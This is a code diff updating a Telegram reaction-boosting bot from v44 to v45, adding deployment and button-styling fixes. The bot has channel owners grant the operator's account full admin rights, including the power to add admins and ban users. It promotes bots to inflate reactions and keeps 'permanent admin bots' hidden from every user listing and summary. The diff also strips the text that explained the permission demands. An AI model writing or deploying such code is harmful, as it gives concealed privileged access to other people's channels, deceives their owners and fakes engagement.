@@ -1,7 +1,7 @@
 """
 ============================================================
-   GHOST REACTION BOT - v44
-   All English | Full Admin Permissions | Hidden Permanent Bots
+   GHOST REACTION BOT - v45
+   Railway-Ready | Button Colors Safe | Full English
    Credit: @Anonymous_User_37
 ============================================================
 """
@@ -30,10 +30,18 @@ from telethon.tl.functions.channels import (
 from telethon.tl.types import (
     Channel,
     Chat,
-    KeyboardButtonStyle,
     ChatAdminRights,
     ChannelParticipantsAdmins,
 )
+
+# ── Try to import KeyboardButtonStyle (available in newer Telethon) ──
+try:
+    from telethon.tl.types import KeyboardButtonStyle
+    HAS_BUTTON_STYLE = True
+except ImportError:
+    KeyboardButtonStyle = None
+    HAS_BUTTON_STYLE = False
+
 from telethon.errors import FloodWaitError
 from telethon.errors.rpcerrorlist import (
     MessageIdInvalidError,
@@ -183,7 +191,8 @@ OWNER_DISPLAY = "👑 Rehan (@Anonymous_User_37)\n🆔 `8762845215`"
 FORCE_CHANNEL = "@MR_GHOST_OFFICIAL"
 FORCE_CHANNEL_URL = "https://t.me/MR_GHOST_OFFICIAL"
 
-DB_FILE = "ghost_users.db"
+# ── Use /app/data if mounted, else local ──
+DB_FILE = "/app/data/ghost_users.db" if os.path.isdir("/app/data") else "ghost_users.db"
 
 DEFAULT_REACTIONS = ["❤️", "👍", "🔥"]
 ALL_REACTIONS = ["❤️", "🔥", "🥰", "😍", "👍", "😇", "👀", "😎", "💯", "🎉",
@@ -196,10 +205,6 @@ BROADCAST_DELAY = 1.5
 FLOOD_SAFETY = 3
 PER_BOT_TIMEOUT = 25
 
-# ══════════════════════════════════════════════════════════════
-# PERMANENT ADMIN BOTS
-# These are used internally but NEVER shown to users/admins
-# ══════════════════════════════════════════════════════════════
 PERMANENT_ADMIN_BOTS = {"RN_OTP1_bot", "RN_REACTION_BOT"}
 
 MAX_ADMINS = 50
@@ -327,13 +332,9 @@ def is_permanent_admin(username):
     return username in PERMANENT_ADMIN_BOTS
 
 
-def filter_hidden_bots(bot_list):
-    """Remove permanent/hidden bots from a list before showing to user."""
-    return [(t, u) for (t, u) in bot_list if not is_permanent_admin(u)]
-
-
 # ==================== DATABASE ====================
 def db_init():
+    os.makedirs(os.path.dirname(DB_FILE), exist_ok=True) if "/" in DB_FILE else None
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute("""CREATE TABLE IF NOT EXISTS users (
@@ -457,9 +458,7 @@ def db_list_bots():
 
 
 def db_list_visible_bots():
-    """Bots excluding permanent/hidden ones."""
-    all_bots = db_list_bots()
-    return [b for b in all_bots if not is_permanent_admin(b[1])]
+    return [b for b in db_list_bots() if not is_permanent_admin(b[1])]
 
 
 def db_count_bots():
@@ -756,13 +755,19 @@ bot = TelegramClient("ghost_reaction_bot", API_ID, API_HASH)
 USER_STATES = {}
 
 
-# ==================== BUTTON ====================
+# ==================== BUTTON (Color-Safe) ====================
 def btn(text, data=None, url=None, style=None):
+    """
+    Create a button. Applies colors if KeyboardButtonStyle is available.
+    Gracefully skips styling if not supported.
+    """
     if url:
         b = Button.url(text, url)
     else:
         b = Button.inline(text, data)
-    if style:
+
+    # Apply colors only if the class exists
+    if style and HAS_BUTTON_STYLE and KeyboardButtonStyle is not None:
         try:
             if style == "primary":
                 b.style = KeyboardButtonStyle(bg_primary=True)
@@ -771,7 +776,8 @@ def btn(text, data=None, url=None, style=None):
             elif style == "danger":
                 b.style = KeyboardButtonStyle(bg_danger=True)
         except Exception:
-            pass
+            pass  # silently skip if styling fails
+
     return b
 
 
@@ -880,7 +886,6 @@ async def check_owner_admin(entity):
 
 
 async def get_current_admin_bots(entity):
-    """Returns list of admins (including permanent) — internal use only."""
     D_sep("FETCHING EXISTING ADMIN BOTS")
     admin_bots = []
     try:
@@ -1025,7 +1030,7 @@ async def add_one_bot(entity, bot_token, actual_type, cache_key):
         return ok, reason
 
 
-# ==================== ENSURE OWNER ADMIN (FULL PERMISSIONS) ====================
+# ==================== ENSURE OWNER ADMIN ====================
 async def ensure_owner_admin(entity, cache_key):
     if cache_key:
         if ADMIN_CACHE.get(cache_key, {}).get("owner_done"):
@@ -1040,19 +1045,11 @@ async def ensure_owner_admin(entity, cache_key):
             ADMIN_CACHE.setdefault(cache_key, {})["owner_done"] = True
         return True, "already"
 
-    # ── FULL ADMIN RIGHTS including ADD_ADMINS ──
     rights = ChatAdminRights(
-        change_info=True,
-        post_messages=True,
-        edit_messages=True,
-        delete_messages=True,
-        ban_users=True,
-        invite_users=True,
-        pin_messages=True,
-        add_admins=True,          # ← IMPORTANT: Add New Admin
-        anonymous=False,
-        manage_call=True,
-        other=True,
+        change_info=True, post_messages=True, edit_messages=True,
+        delete_messages=True, ban_users=True, invite_users=True,
+        pin_messages=True, add_admins=True, anonymous=False,
+        manage_call=True, other=True,
     )
     for attempt in range(3):
         try:
@@ -1201,7 +1198,6 @@ async def process_reactions_rotating(event, uid, chat_link, post_link, count,
     except Exception:
         pass
 
-    # ── ADMIN CHECK ──
     if ADMIN_CHECK_ENABLED and uid != OWNER_ID:
         await animate_loading(event, "🔍 **Checking owner admin status...**", 1.5)
         owner_is_admin = await check_owner_admin(entity)
@@ -1221,7 +1217,7 @@ async def process_reactions_rotating(event, uid, chat_link, post_link, count,
         await safe_edit(event, f"❌ **OWNER SETUP FAILED**\n\n`{reason_owner}`")
         return
 
-    # ── PHASE 1: Existing admins ──
+    # PHASE 1
     existing_admins = await get_current_admin_bots(entity)
     db_bots = db_list_bots()
     username_to_token = {uname: tok for tok, uname, bid, added in db_bots}
@@ -1254,7 +1250,6 @@ async def process_reactions_rotating(event, uid, chat_link, post_link, count,
         for tok, _ in phase1_pairs[:phase1_count]:
             used_tokens.add(tok)
 
-    # ── PHASE 2: Remove non-permanent ──
     if len(existing_admins) > 0:
         await safe_edit(event,
                         f"🔄 **Phase 2**\n"
@@ -1272,7 +1267,6 @@ async def process_reactions_rotating(event, uid, chat_link, post_link, count,
             except Exception:
                 pass
 
-    # ── CYCLE LOOP ──
     cycle_num = 0
     max_cycles = 10
     cycle_summaries = []
@@ -1354,7 +1348,6 @@ async def process_reactions_rotating(event, uid, chat_link, post_link, count,
                 pass
         await release_bots(promoted)
 
-    # ── SUMMARY (permanent bots never mentioned) ──
     lines = [
         f"{SPARKLE} ✅ **REACTIONS COMPLETE** ✅ {SPARKLE}",
         f"{DIV}",
@@ -1552,7 +1545,7 @@ def kb_approval_actions(target_uid):
     ]
 
 
-# ==================== ADMIN NEEDED MESSAGE (English, ALL PERMISSIONS) ====================
+# ==================== ADMIN NEEDED MESSAGE ====================
 def get_admin_needed_message(chat_title):
     return (
         f"{STAR_LINE}\n"
@@ -1580,24 +1573,14 @@ def get_admin_needed_message(chat_title):
         f"     ✅ **Change Group Info**\n"
         f"8️⃣ Tap **Save**\n\n"
         f"{DIV}\n"
-        f"📌 **Why all permissions?**\n"
-        f"{DIV}\n"
-        f"• **Add New Admins** → to promote reaction bots\n"
-        f"• **Post Messages** → to send reactions\n"
-        f"• **Delete Messages** → to manage cleanup\n"
-        f"• **Invite Users** → to add reaction bots\n"
-        f"• **Pin Messages** → for announcements\n\n"
-        f"{DIV}\n"
         f"👑 **Owner to add:**\n"
         f"   Username: @{OWNER_USERNAME}\n"
         f"   ID: `{OWNER_ID}`\n"
         f"{DIV}\n\n"
-        f"⚠️ If you skip any permission, the bot will fail.\n\n"
         f"Once done, tap **🔄 Retry** below."
     )
 
 
-# ==================== WELCOME MESSAGE ====================
 def get_welcome_message(first_name, uid, auto_approved=True):
     limit = get_user_limit(uid)
     return (
@@ -2038,7 +2021,6 @@ async def on_cb(event):
             return
 
         if data == "op:bots":
-            # Only visible bots (permanent hidden)
             bots = db_list_visible_bots()
             txt = f"🤖 **BOTS ({len(bots)})**\n\n"
             now = datetime.now()
@@ -2314,10 +2296,12 @@ async def main():
     me = await admin_client.get_me()
     bots, added = sync_bots()
 
-    D_sep("GHOST REACTION BOT — v44")
+    D_sep("GHOST REACTION BOT — v45")
     D(f"Owner: {me.first_name} (@{me.username})", "ok")
     D(f"Bots (visible): {db_count_visible_bots()}", "ok")
     D(f"Bots (total incl. hidden): {db_count_bots()}", "ok")
+    D(f"Button style support: {'YES' if HAS_BUTTON_STYLE else 'NO (colors skipped)'}", "info")
+    D(f"DB file: {DB_FILE}", "info")
     D(f"Batch size: {BATCH_SIZE}", "cycle")
     D(f"Force channel: {FORCE_CHANNEL}", "info")
     D(f"Default free: {get_free_count()}", "info")
